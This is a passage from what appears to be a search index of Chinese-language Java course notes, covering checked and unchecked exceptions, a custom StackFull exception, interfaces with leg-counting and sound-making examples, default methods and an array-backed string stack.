<code>throw</code> \u5199\u6cd5\u9632\u6b62\u5806\u6808\u7a7a\u95f4\u5df2\u6ee1\uff0c\u751f\u6210\u65b0\u7684 <code>RuntimeException</code> \u903b\u8f91\u9519\u8bef\u5bf9\u8c61\uff0c\u7b2c\u4e94\u884c stack \u9876\u66f4\u65b0</p>"},{"location":"cs/java/basics/w8/#pop","title":"<code>pop()</code>","text":"<pre><code>public String pop() {\n    if (top == 0) {\n        throw new RuntimeException(\"Stack is empty\");\n    }\n    return data[--top];\n}\n</code></pre> <p>\u7b2c\u4e94\u884c stack \u9876\u66f4\u65b0</p>"},{"location":"cs/java/basics/w8/#runtimeexception","title":"RuntimeException","text":"<ul> <li>\u6709\u4e24\u79cd\u5f02\u5e38\uff1a\u8fd0\u884c\u65f6\u5f02\u5e38\u548c\u5176\u4ed6\u6240\u6709\u5f02\u5e38\u3002</li> <li>\u8fd0\u884c\u65f6\u5f02\u5e38\u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\uff0c\u5b83\u4ee3\u8868\u4e86\u7a0b\u5e8f\u4e2d\u7684\u903b\u8f91\u9519\u8bef\u3002</li> <li>\u5b83\u4eec\u88ab\u79f0\u4e3a\u201c\u672a\u68c0\u67e5\u5f02\u5e38\u201d\uff0c\u56e0\u4e3a\u4f60\u4e0d\u5fc5\u68c0\u67e5\u5b83\u4eec\u3002</li> <li>\u5176\u4ed6\u5f02\u5e38\u53eb\u4f5c \u201c\u5df2\u68c0\u67e5\u5f02\u5e38\u201d\uff0c\u4f60\u5fc5\u987b\u7528 <code>try-catch</code> \u6765\u68c0\u67e5\u5b83\u4eec\u3002</li> </ul>"},{"location":"cs/java/basics/w8/#custom-exception","title":"Custom Exception","text":"<pre><code>public class StackFull extends Exception {\n    public StackFull(String message) {\n        super(message);\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u662f\u4e00\u4e2a\u65b0\u7684\u5f02\u5e38\u7c7b\uff0c\u63cf\u8ff0\u4e86\u6211\u4eec\u7684\u6808\u5df2\u6ee1\u7684\u60c5\u51b5</p> <ul> <li>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6269\u5c55 <code>Throwable</code> \u6216\u5176\u5b50\u7c7b\u6765\u521b\u5efa\u81ea\u5df1\u7684\u5f02\u5e38</li> <li>\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4f60\u5e94\u8be5\u53ea\u6269\u5c55 <code>Exception</code>\u3001<code>RuntimeException</code> \u6216\u5b83\u4eec\u7684\u5b50\u7c7b</li> <li><code>Exception</code> \u901a\u5e38\u7528\u4e8e\u53ef\u6062\u590d\u7684\u9519\u8bef\uff0c\u800c <code>RuntimeException</code> \u7528\u4e8e\u7a0b\u5e8f\u9519\u8bef\uff0c<code>Error</code> \u7528\u4e8e\u7cfb\u7edf\u9519\u8bef</li> <li>\u5bf9\u4e8e\u6211\u4eec\u7684\u6808\u6765\u8bf4\uff0c<code>RuntimeException</code> \u53ef\u80fd\u662f\u4e00\u4e2a\u66f4\u597d\u7684\u9009\u62e9\uff0c\u4f46\u6211\u4eec\u4f7f\u7528 <code>Exception</code> \u6765\u6f14\u793a\u68c0\u67e5\u578b\u5f02\u5e38</li> </ul> <p>\u4ee5\u4e0b\u6587\u4ef6\u4f7f\u7528\uff1a</p> <pre><code>public void push(String s) {\n    if (top == data.length) {\n        throw new StackFull(\"Stack can only hold \" + data.length + \"elements\");\n    }\n    data[top++] = s;\n}\n</code></pre> <p>\u81ea\u5b9a\u4e49\u5b8c\u6bd5\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u662f\u4ee5\u4e0a\u4ee3\u7801\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u9488\u5bf9\u53ef\u80fd\u629b\u51fa\u53d7\u68c0\u5f02\u5e38\u7684\u4ee3\u7801\uff1a</p> <ul> <li>\u6709\u4e9b\u9519\u8bef\u662f\u201c\u9700\u8981\u7279\u522b\u6ce8\u610f\u3001\u5fc5\u987b\u63d0\u524d\u5904\u7406\u6216\u58f0\u660e\u201d\u7684\u98ce\u9669\uff0c\u6bd4\u5982\u6587\u4ef6\u627e\u4e0d\u5230 (<code>IOException</code>)\u3001\u6570\u636e\u5e93\u8fde\u63a5\u4e0d\u4e0a (<code>SQLException</code>)\uff0c\u6216\u8005\u50cf\u6211\u4eec\u8fd9\u91cc\u5b9a\u4e49\u7684\u201c\u6808\u6ee1\u4e86\u201d\uff08<code>StackFull</code>\uff09\u3002\u8fd9\u4e9b\u5c31\u662f\u53d7\u68c0\u5f02\u5e38\u3002</li> </ul> <ul> <li>\u8981\u4e48\u4f7f\u7528 <code>try catch</code> \u5f53\u573a\u6355\u83b7\uff0c\u8981\u4e48\u5728\u65b9\u6cd5\u7b7e\u540d\u4e0a\u7528 <code>throws</code> \u5173\u952e\u5b57\u58f0\u660e\u3002\u8b66\u544a\u8c03\u7528\u8005\u8fd9\u4e2a\u65b9\u6cd5\u6709\u629b\u51fa\u8fd9\u79cd\u5f02\u5e38\u7684\u98ce\u9669</li> <li><code>Unchecked Exception</code>\uff0c\u901a\u5e38\u6307 <code>RuntimeException</code> \u53ca\u5176\u5b50\u7c7b\uff0c\u6bd4\u5982 <code>NullPointerException</code>, <code>ArrayIndexOutOfBoundsException</code>\u3002Java \u4e0d\u5f3a\u5236\u4f60\u5fc5\u987b\u58f0\u660e\u6216\u6355\u83b7\u5b83\u4eec\uff0c\u56e0\u4e3a\u5b83\u4eec\u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u7f16\u7a0b\u903b\u8f91\u9519\u8bef</li> </ul> <pre><code>public void push(String s) throws StackFull {\n    if (top == data.length) {\n        throw new StackFull(\"Stack can only hold \" + data.length + \"elements\");\n    }\n    data[top++] = s;\n}\n</code></pre> <ul> <li>A comma-separated list can be used to throw multiple exceptions: <code>throws Exception1, Excpetion2</code></li> </ul> <p>\u90a3\u4e48\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u4e00\u65e6\u8c03\u7528\u8be5 <code>Checked Exception</code> \u65b9\u6cd5\uff0cJava \u7684\u89c4\u5219\u662f \u201c\u8981\u4e48\u6355\u83b7\uff0c\u8981\u4e48\u58f0\u660e\u201d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8c03\u7528\u8005\uff08\u8fd9\u91cc\u662f <code>main</code> \u65b9\u6cd5\uff09\u5fc5\u987b\u4e8c\u9009\u4e00\uff1a</p> <ul> <li>\u6355\u83b7 (Catch): \u4f7f\u7528 <code>try...catch</code> \u5757\u628a\u8c03\u7528\u8bed\u53e5\u5305\u8d77\u6765\uff0c\u5e76\u5728 <code>catch</code> \u90e8\u5206\u5904\u7406\u53ef\u80fd\u53d1\u751f\u7684 <code>StackFull</code> \u5f02\u5e38\u3002</li> <li>\u58f0\u660e (Declare): \u5728 <code>main</code> \u65b9\u6cd5\u81ea\u5df1\u7684\u7b7e\u540d\u4e0a\u4e5f\u52a0\u4e0a <code>throws StackFull</code>\uff0c\u628a\u5904\u7406\u8fd9\u4e2a\u5f02\u5e38\u7684\u8d23\u4efb\u7ee7\u7eed\u5f80\u4e0a\uff08\u6700\u7ec8\u4f1a\u4f20\u7ed9 JVM\uff0c\u5bfc\u81f4\u7a0b\u5e8f\u53ef\u80fd\u56e0\u672a\u6355\u83b7\u5f02\u5e38\u800c\u7ec8\u6b62\uff09\u3002</li> </ul> <pre><code>public static void main(String[] args) {\n    StringStack2 ss = new StringStack2(5);\n    try {\n        ss.push(\"Hello\");\n        ss.push(\"World\");\n        ss.push(\"!\");\n        ss.push(\"Hello\");\n        ss.push(\"World\");\n        ss.push(\"!\");\n    } catch (StackFull e) {\n        System.out.println(e);\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u5c31\u4f1a\u7ee7\u7eed\u6267\u884c\uff0c\u56e0\u4e3a\u53ef\u4ee5\u6293\u4f4f <code>StackFull</code> \u5f02\u5e38</p>"},{"location":"cs/java/basics/w8/#interfaces","title":"Interfaces","text":"<p>Java \u8bed\u8a00\u4e0d\u5141\u8bb8\u7c7b\u7684\u591a\u91cd\u7ee7\u627f\u3002\u5047\u8bbe\u6211\u4eec\u6709\u4e24\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u7c7b\uff0c\u5206\u522b\u53eb\u505a A \u548c B\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u60f3\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7c7b C\uff0c\u8ba9\u5b83\u540c\u65f6\u7ee7\u627f A \u548c B \u7684\u7279\u6027\u548c\u529f\u80fd\uff0c\u8fd9\u662f\u4e0d\u5141\u8bb8\u7684\u3002\u4f60\u4e0d\u80fd\u5199\u50cf <code>class C extends A, B { ... }</code> \u8fd9\u6837\u7684\u4ee3\u7801\u3002\u5728 Java \u91cc\uff0c\u4e00\u4e2a\u7c7b\u6700\u591a\u53ea\u80fd\u76f4\u63a5\u7ee7\u627f \u4e00\u4e2a \u7236\u7c7b (<code>class C extends A</code> \u662f\u53ef\u4ee5\u7684)\u3002</p> <ul> <li>\u6700\u4e3b\u8981\u7684\u539f\u56e0\u662f\u4e3a\u4e86\u907f\u514d\u4ea7\u751f\u6b67\u4e49\u548c\u6df7\u6dc6\u3002\u5982\u679c\u5141\u8bb8\u4e00\u4e2a\u7c7b\u540c\u65f6\u7ee7\u627f\u4e24\u4e2a\u7236\u7c7b\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u8ba9\u7f16\u8bd1\u5668\u6216\u8fd0\u884c\u65f6\u73af\u5883 \u201c\u4e0d\u77e5\u9053\u8be5\u542c\u8c01\u7684\u201d \u7684\u5c34\u5c2c\u60c5\u51b5\u3002</li> <li>\u5f53\u4f60\u521b\u5efa\u4e00\u4e2a C \u7684\u5bf9\u8c61 <code>c</code>\uff0c\u7136\u540e\u8c03\u7528 <code>c.doWork()</code> \u65f6\uff0c\u7a0b\u5e8f\u5e94\u8be5\u6267\u884c A \u7248\u672c\u7684 <code>doWork()</code> \u8fd8\u662f B \u7248\u672c\u7684 <code>doWork()</code> \u5462\uff1f\u8fd9\u5c31\u4ea7\u751f\u4e86\u6b67\u4e49\uff0c\u4e0d\u77e5\u9053\u8be5\u9009\u62e9\u54ea\u4e2a\u5b9e\u73b0\u3002\u5982\u679c\u7c7b A \u6709\u4e2a\u53d8\u91cf <code>name</code> (\u7c7b\u578b\u662f String)\uff0c\u7c7b B \u4e5f\u6709\u4e2a\u53d8\u91cf <code>name</code> (\u7c7b\u578b\u53ef\u80fd\u662f int\uff0c\u6216\u8005\u4e5f\u662f String \u4f46\u8bbf\u95ee\u6743\u9650\u4e0d\u540c)\u3002</li> </ul> <ul> <li>\u4e0e\u5176\u8bbe\u8ba1\u590d\u6742\u7684\u89c4\u5219\u50cf C++ \u6765\u89e3\u51b3\u4e0a\u8ff0\u7684\u6b67\u4e49\u95ee\u9898\uff0cJava \u76f4\u63a5\u7981\u7528\u591a\u91cd\u7ee7\u627f\uff0c\u6539\u7528\u4e86\u63a5\u53e3 Interface \u89e3\u51b3\u8be5\u95ee\u9898</li> </ul> <ul> <li>An interface is like a class that only contains abstract methods</li> </ul> <p>\u63a5\u53e3\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u79cd\u7eaf\u7cb9\u7684\u201c\u5408\u540c\u201d\u6216\u201c\u89c4\u8303\u201d\u3002\u5b83\u4e3b\u8981\u5c31\u662f\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u65b9\u6cd5\u7b7e\u540d\uff08\u901a\u5e38\u662f\u62bd\u8c61\u7684\uff0c\u6ca1\u6709\u5b9e\u73b0\u4f53\uff09\uff0c\u89c4\u5b9a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u7684\u7c7b\u5fc5\u987b\u63d0\u4f9b\u8fd9\u4e9b\u65b9\u6cd5\u7684\u5177\u4f53\u5b9e\u73b0\u3002\uff08\u6ce8\uff1aJava 8 \u4e4b\u540e\u63a5\u53e3\u53ef\u4ee5\u6709\u9ed8\u8ba4\u5b9e\u73b0\u7b49\uff0c\u4f46\u6838\u5fc3\u6982\u5ff5\u4ecd\u662f\u5b9a\u4e49\u89c4\u8303\uff09\u3002\u56e0\u4e3a\u63a5\u53e3\uff08\u4f20\u7edf\u4e0a\uff09\u53ea\u5305\u542b\u62bd\u8c61\u65b9\u6cd5\uff0c\u6ca1\u6709\u5177\u4f53\u7684\u5b9e\u73b0\u4ee3\u7801\uff0c\u6240\u4ee5\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u591a\u4e2a\u63a5\u53e3\u65f6\uff0c\u5c31\u4e0d\u4f1a\u9047\u5230\u524d\u9762\u8bf4\u7684\u201c\u7ee7\u627f\u54ea\u4e2a\u5b9e\u73b0\u201d\u7684\u6b67\u4e49\u95ee\u9898\u3002</p> <ul> <li><code>implements</code> \u5173\u952e\u5b57\uff1a\u5f53\u4e00\u4e2a\u7c7b\u8981\u9075\u5b88\u67d0\u4e2a\u63a5\u53e3\u7684\u89c4\u8303\u65f6\uff0c\u6211\u4eec\u7528 <code>implements</code> \u5173\u952e\u5b57\uff0c\u800c\u4e0d\u662f <code>extends</code>\u3002</li> </ul> <ul> <li>\u4e00\u4e2a\u7c7b\u53ef\u4ee5 <code>implements</code> \u4efb\u610f\u6570\u91cf\u7684\u63a5\u53e3\uff0c\u7528\u9017\u53f7\u9694\u5f00\u3002\u4f8b\u5982 <code>class F implements B, C { ... }</code>\uff0c\u610f\u5473\u7740 F \u7c7b\u627f\u8bfa\u4f1a\u5b9e\u73b0 B \u63a5\u53e3\u548c C \u63a5\u53e3\u8981\u6c42\u7684\u6240\u6709\u65b9\u6cd5\u3002</li> </ul> <ul> <li>\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u6700\u591a\u7ee7\u627f\u4e00\u4e2a\u7236\u7c7b (<code>extends</code>)\uff0c\u540c\u65f6\u5b9e\u73b0\u4efb\u610f\u591a\u4e2a\u63a5\u53e3 (<code>implements</code>)\u3002\u4f8b\u5982 <code>class D extends A implements B { ... }</code>\uff0c\u610f\u5473\u7740 D \u7ee7\u627f\u4e86 A \u7684\u7279\u6027\uff08\u53ef\u80fd\u5305\u62ec\u4e00\u4e9b\u5177\u4f53\u5b9e\u73b0\uff09\uff0c\u5e76\u4e14\u8fd8\u627f\u8bfa\u9075\u5b88 B \u63a5\u53e3\u7684\u89c4\u8303\u3002</li> </ul> <ul> <li>\u5982\u679c\u63a5\u53e3 B \u548c\u63a5\u53e3 C \u90fd\u8981\u6c42\u4e00\u4e2a <code>doSomething()</code> \u65b9\u6cd5\uff0c\u5b9e\u73b0\u5b83\u4eec\u7684\u7c7b F \u53ea\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a <code>doSomething()</code> \u7684\u5b9e\u73b0\uff0c\u5c31\u80fd\u540c\u65f6\u6ee1\u8db3\u4e24\u4e2a\u63a5\u53e3\u7684\u8981\u6c42\u3002</li> </ul>"},{"location":"cs/java/basics/w8/#concepts","title":"Concepts","text":"<pre><code>public interface Example {\n    void exampleMethod1(int param);\n    double exampleMethod2(String s, int x);\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5b9a\u4e49\u63a5\u53e3\u548c\u5b9a\u4e49\u7c7b\u5f88\u50cf\uff0c\u53ea\u662f\u628a <code>class</code> \u5173\u952e\u5b57\u6362\u6210\u4e86 <code>interface</code>\u3002</p> <ul> <li>\u4e00\u4e2a\u516c\u5f00\u7684\u9876\u7ea7\u63a5\u53e3\u5e94\u8be5\u653e\u5728\u4e0e\u63a5\u53e3\u540c\u540d\u7684 <code>.java</code> \u6587\u4ef6\u91cc\uff0c\u9876\u7ea7\u63a5\u53e3\u6307\u7684\u662f\u76f4\u63a5\u5b9a\u4e49\u5728\u4e00\u4e2a <code>.java</code> \u6e90\u6587\u4ef6\u7684\u6700\u5916\u5c42\u3001\u4e0d\u5d4c\u5957\u5728\u4efb\u4f55\u5176\u4ed6\u7c7b\u6216\u63a5\u53e3\u5185\u90e8\u7684\u63a5\u53e3\u3002\u4e00\u4e2a <code>.java</code> \u6587\u4ef6\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2a\u9876\u7ea7\u7c7b\u578b\uff08\u7c7b\u6216\u63a5\u53e3\uff09\uff0c\u4f46\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u662f <code>public</code> \u7684\uff0c\u5e76\u4e14\u6587\u4ef6\u540d\u5fc5\u987b\u4e0e\u8fd9\u4e2a <code>public</code> \u7684\u9876\u7ea7\u7c7b\u578b\u5339\u914d\u3002</li> </ul> <pre><code>// MyInterface.java \u6587\u4ef6\n\npackage com.example;\n\n// \u8fd9\u4e2a MyInterface \u5c31\u662f\u4e00\u4e2a\u9876\u7ea7\u63a5\u53e3\npublic interface MyInterface {\n    void methodA();\n}\n\n// \u8fd9\u4e2a MyHelperClass \u5c31\u662f\u4e00\u4e2a\u9876\u7ea7\u7c7b (\u53ef\u4ee5\u5728\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u4f46\u53ea\u80fd\u6709\u4e00\u4e2a\u662f public)\nclass MyHelperClass {\n    // ...\n}\n</code></pre> <ul> <li>\u63a5\u53e3\u91cc\u7684\u6210\u5458\u9ed8\u8ba4\u5c31\u662f\u516c\u5f00\u7684\uff0c<code>Java 8</code> \u4e4b\u524d\u9ed8\u8ba4\u62bd\u8c61\uff0c\u5c31\u7b97\u4e0d\u5199\u5173\u952e\u5b57\uff0c\u975e\u516c\u5f00\u6210\u5458\u4e0d\u7b26\u5408\u63a5\u53e3\u7406\u5ff5</li> </ul>"},{"location":"cs/java/basics/w8/#haslegs-example","title":"HasLegs Example","text":"<pre><code>public interface HasLegs {\n    int countLegs();\n}\n</code></pre> <p>\u63a5\u53e3\u5f80\u5f80\u4ee3\u8868\u4e86\u4e00\u79cd\u5951\u7ea6\uff0c\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u4ee3\u7801\u5728\u5b9e\u73b0\u7684\u65f6\u5019\u90fd\u6709\u8fd4\u56de\u684c\u817f\u6570\uff0c\u9075\u5b88\u4e86\u8fd9\u4e00\u51c6\u5219</p> <pre><code>class Chair implements HasLegs {\n    public int countLegs() {\n        return 4;\n    }\n}\n\nclass Person implements HasLegs {\n    public int countLegs() {\n        return 2;\n    }\n}\n\nclass Spider implements HasLegs {\n    public int countLegs() {\n        return 8;\n    }\n}\n</code></pre> <ul> <li>\u8fd9\u4e2a <code>HasLegs</code> \u63a5\u53e3\u4ee3\u8868\u4e86\u201c\u62e5\u6709\u53ef\u4ee5\u88ab\u8ba1\u6570\u7684\u817f\u201d\u8fd9\u6837\u4e00\u79cd\u6982\u5ff5\u6216\u80fd\u529b\u3002</li> </ul> <ul> <li>\u63a5\u53e3\u901a\u5e38\u5c31\u7528\u6765\u5b9a\u4e49\u8fd9\u79cd\u62bd\u8c61\u7684\u6982\u5ff5\u3001\u80fd\u529b\u3001\u7279\u5f81\u6216\u626e\u6f14\u7684\u89d2\u8272\uff08\u6bd4\u5982 Java \u81ea\u5e26\u7684 <code>Runnable</code> \u8868\u793a\u201c\u80fd\u8dd1\u7684\u201d\uff0c<code>Comparable</code> \u8868\u793a\u201c\u80fd\u6bd4\u8f83\u7684\u201d\uff09\u3002</li> </ul> <ul> <li>\u63a5\u53e3 (Interface) \u901a\u5e38\u4ee3\u8868\u4e00\u79cd\u6982\u5ff5\u3001\u7279\u5f81\u3001\u80fd\u529b\u6216\u89c4\u8303 (notion or trait)\u3002</li> </ul> <ul> <li>\u7c7b (Class) \u901a\u5e38\u4ee3\u8868\u4e00\u79cd\u5177\u4f53\u7684\u4e8b\u7269\u6216\u5bf9\u8c61\u7684\u7c7b\u578b (type of thing) \uff08\u6bd4\u5982 <code>Dog</code>, <code>Table</code>, <code>Robot</code>\uff09\u3002</li> </ul> <pre><code>public class CountLegs {\n    public static void main(String[] args) {\n        HasLegs[] things = new HasLegs[3];\n        things[0] = new Chair();\n        things[1] = new Person();\n        things[2] = new Spider();\n        int sum = 0;\n        for (int i = 0; i &lt; things.length; i++) {\n            sum += things[i].countLegs();\n        }\n        System.out.println(\"Total number of legs: \" + sum);\n    }\n}\n</code></pre> <p><code>HasLegs[]</code> \u53ef\u4ee5\u770b\u5230\u63a5\u53e3\u53ef\u4ee5\u88ab\u5f53\u4f5c\u6570\u7ec4\u3001\u53d8\u91cf\u4e00\u6837\u4f7f\u7528\uff0c\u5c31\u50cf Class \u4e00\u6837</p>"},{"location":"cs/java/basics/w8/#makessounds-example","title":"MakesSounds Example","text":"<pre><code>public interface MakesSounds {\n    String sound();\n}\n</code></pre> <pre><code>abstract class Insect implements HasLegs {\n    @Override\n    public int countLegs() {\n        return 6;\n    }\n}\n// \u62bd\u8c61\u7c7b\u5b9e\u73b0\u4e86 HasLegs \u63a5\u53e3\u540e\u8986\u5199\u9ed8\u8ba4\u6606\u866b\u6709\u516d\u6761\u817f\n\nclass Cricket extends Insect implements MakesSounds {\n    @Override\n    public String sound() {\n        return \"Chirp\";\n    }\n}\n// \u83b7\u5f97\u65b9\u6cd5\uff0c\u5b9e\u73b0 sound \u5177\u4f53\u7ec6\u8282\n\nclass SqueakyChair implements HasLegs, MakesSounds {\n    @Override\n    public int countLegs() {\n        return 4;\n    }\n\n    @Override\n    public String sound() {\n        return \"Squeak\";\n    }\n}\n// \u5b9e\u73b0\u591a\u63a5\u53e3\n</code></pre> <pre><code>public class SoundExample {\n    public static void main(String[] args) {\n        MakesSounds[] things = { new Cricket(), new SqueakyChair() };\n        for (MakesSounds thing : things)\n            System.out.println(thing.sound());\n        HasLegs[] legs = { new Cricket(), new SqueakyChair() };\n        for (HasLegs leg : legs)\n            System.out.println(leg.countLegs());\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230  <code>MakeSounds[]</code> \u4ee5\u53ca <code>HasLegs[]</code> \u76f4\u63a5\u628a\u63a5\u53e3\u5206\u522b\u5f53\u6570\u7ec4\u50a8\u5b58\u5176\u5177\u6709\u76f8\u5173\u7279\u6027\u7684\u7c7b\u4f7f\u7528\uff0c\u7136\u540e\u5206\u522b\u6253\u5370\u5176\u529f\u80fd\uff0c\u4f53\u73b0\u4e86\u591a\u6001\u6027\uff0c\u5f53\u7136\u4e3a\u4e86\u7528\u6237\u66f4\u65b9\u4fbf\u5b9e\u73b0\uff0c\u53ef\u4ee5\u5728\u63a5\u53e3\u5c42\u5c31\u76f4\u63a5\u5b9e\u73b0\u63a5\u53e3\u7ee7\u627f\uff1a</p> <pre><code>public interface HasLegsAndMakesSounds extends HasLegs, MakesSounds {\n    // This interface has no methods of its own.\n    // It inherits the methods from its two parent interfaces.\n}\n</code></pre> <ul> <li>\u53ef\u4ee5\u770b\u5230\u63a5\u53e3\u4e5f\u53ef\u4ee5\u7ee7\u627f\u63a5\u53e3\uff0c\u591a\u63a5\u53e3\u76f4\u63a5\u628a\u4e24\u4e2a\u7279\u6027\u63d0\u524d\u7ed3\u5408\uff0c\u8fd9\u6837\u5728\u5b9e\u73b0\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u76f4\u63a5\u5c06\u8fd9\u5feb\u901f\u5b9e\u73b0\u540c\u65f6\u5177\u5907\u8fd9\u4e24\u79cd\u7279\u6027\u7684\u7c7b</li> </ul> <pre><code>abstract class Insect implements HasLegs {\n    @Override\n    public int countLegs() {\n        return 6;\n    }\n}\n\nclass Cricket extends Insect implements HasLegsAndMakesSounds {\n    @Override\n    public String sound() {\n        return \"Chirp\";\n    }\n}\n\nclass SqueakyChair implements HasLegsAndMakesSounds {\n    @Override\n    public int countLegs() {\n        return 4;\n    }\n\n    @Override\n    public String sound() {\n        return \"Squeak\";\n    }\n}\n</code></pre> <pre><code>public class LegsAndSoundsExample {\n    public static void main(String[] args) {\n        HasLegsAndMakesSounds[] things = { new Cricket(), new SqueakyChair() };\n        for (HasLegsAndMakesSounds thing : things) {\n            System.out.println(thing.sound());\n            System.out.println(thing.countLegs());\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#interface-variables","title":"Interface variables","text":"<ul> <li>\u63a5\u53e3\u53ef\u4ee5\u5b9a\u4e49\u53d8\u91cf\uff08\u5e38\u91cf\uff09\uff1a \u63a5\u53e3\u5185\u90e8\u53ef\u4ee5\u5b9a\u4e49\u53d8\u91cf\u3002\u4f46\u8981\u7279\u522b\u6ce8\u610f\uff0c\u63a5\u53e3\u4e2d\u5b9a\u4e49\u7684\u4efb\u4f55\u53d8\u91cf\u9ed8\u8ba4\u90fd\u662f <code>public static final</code> \u7684\u3002\u4f46\u662f\u5728\u63a5\u53e3\u5904\u5b9a\u4e49\u5e38\u91cf\u662f\u53ca\u5176\u5c11\u89c1\u7684\uff0c\u540c\u540d\u5e38\u91cf\u4f1a\u76f4\u63a5\u5bfc\u81f4\u7f16\u8bd1\u9519\u8bef\uff0c\u63a5\u53e3\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5b9a\u4e49\u884c\u4e3a\u800c\u4e0d\u662f\u50a8\u5b58\u5e38\u91cf</li> </ul> <pre><code>interface A {\n    int x = 1;\n}\n\ninterface B {\n    double x = 2.0;\n}\n\ninterface C extends A, B {\n    // What's the type of C.x?\n}\n\npublic class DuplicateFields {\n    public static void main(String[] args) {\n        System.out.println(C.x);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#default","title":"<code>default</code>","text":"<p><code>Java 8</code> \u4e4b\u524d\u63a5\u53e3\u4e2d\u53ea\u80fd\u5305\u542b\u62bd\u8c61\u65b9\u6cd5\u6ca1\u6709\u65b9\u6cd5\u4f53\u548c\u5e38\u91cf\u7684\u6982\u5ff5\uff0c\u6240\u6709\u63a5\u53e3\u7684\u7c7b\u5fc5\u987b\u63d0\u4f9b\u63a5\u53e3\u4e2d\u6240\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> <pre><code>interface HasId {\n    default int getId() {\n        return 0;\n    }\n\n    public class Admin implements HasId {\n        // No need to override getId()\n    }\n}\n</code></pre> <p>\u7b2c\u4e8c\u884c\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u65b9\u6cd5</p> <ul> <li>\u53ef\u80fd\u5bfc\u81f4\u591a\u91cd\u7ee7\u627f\u9519\u8bef\uff1a \u5982\u679c\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u4e24\u4e2a\u4e0d\u540c\u7684\u63a5\u53e3\uff0c\u800c\u8fd9\u4e24\u4e2a\u63a5\u53e3\u6070\u597d\u90fd\u63d0\u4f9b\u4e86\u540c\u540d\u540c\u53c2\u6570\u7684\u9ed8\u8ba4\u65b9\u6cd5\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7c7b\u5c31\u5fc5\u987b\u81ea\u5df1\u91cd\u5199\u8fd9\u4e2a\u65b9\u6cd5\u6765\u660e\u786e\u6307\u5b9a\u5230\u5e95\u4f7f\u7528\u54ea\u4e2a\u5b9e\u73b0\u6216\u8005\u63d0\u4f9b\u4e00\u4e2a\u5168\u65b0\u7684\u5b9e\u73b0\uff0c\u5426\u5219\u5c31\u4f1a\u4ea7\u751f\u7f16\u8bd1\u9519\u8bef\u3002\u8fd9\u4f7f\u5f97\u9ed8\u8ba4\u65b9\u6cd5\u867d\u7136\u7075\u6d3b\uff0c\u4f46\u4e5f\u9700\u8981\u8c28\u614e\u4f7f\u7528\uff0c\u901a\u5e38\u7528\u4e8e\u7279\u5b9a\u573a\u666f\uff08\u5982\u5411\u540e\u517c\u5bb9\u5730\u7ed9\u63a5\u53e3\u6dfb\u52a0\u65b0\u529f\u80fd\uff09\u3002</li> </ul> <p>\u8fd9\u4e2a\u8003\u8bd5\u4e0d\u8003</p>"},{"location":"cs/java/basics/w8/#stack-interface","title":"Stack Interface","text":"<p>\u4f7f\u7528\u63a5\u53e3\u5b9e\u73b0\u5806\u6808\u6982\u5ff5</p> <pre><code>public interface StringStack {\n    String pop();\n    void push(String s);\n    boolean isEmpty();\n}\n</code></pre> <pre><code>public class ArrayStringStack implements StringStack {\n    private String[] stack;\n\n    public ArrayStringStack() {\n        stack = new String[0];\n    }\n\n    @Override\n    public String pop() {\n        // removes this.stack[0] and returns it\n    }\n\n    @Override\n    public void push(String s) {\n        // Resizes this.stack with s at position 0\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return stack.length == 0;\n    }\n}\n</code></pre> <p>\u8fd9\u4e00\u6bb5\u4f7f\u7528 Array \u5b9e\u73b0\uff0c\u5f88\u6709\u53ef\u80fd\u660e\u5929\u8981\u8003</p> <pre><code>public interface StringStack {\n    String pop();\n    void push(String s);\n    boolean isEmpty();\n}\n\npublic class ArrayStringStack implements StringStack {\n\n    private String[] stack;\n\n    public ArrayStringStack() {\n        stack = new String[0];\n    }\n\n    @Override\n    public String pop() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"Cannot pop from an empty stack.\");\n        }\n        String topElement = stack[0];\n        String[] newStack = new String[stack.length - 1];\n        System.arraycopy(this.stack, 1, newStack, 0, newStack.length);\n        this.stack = newStack;\n        return topElement;\n    }\n\n    @Override\n    public void push(String s) {\n        String[] newStack = new String[stack.length + 1];\n        newStack[0] = s;\n        System.arraycopy(this.stack, 0, newStack, 1, this.stack.length);\n        this.stack = newStack;\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return stack.length == 0;\n    }\n\n    @Override\n    public String toString() {\n        if (isEmpty()) {\n            return \"Stack (top=empty): []\";\n        }\n        // Manually build the string representation\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"Stack (top=\");\n        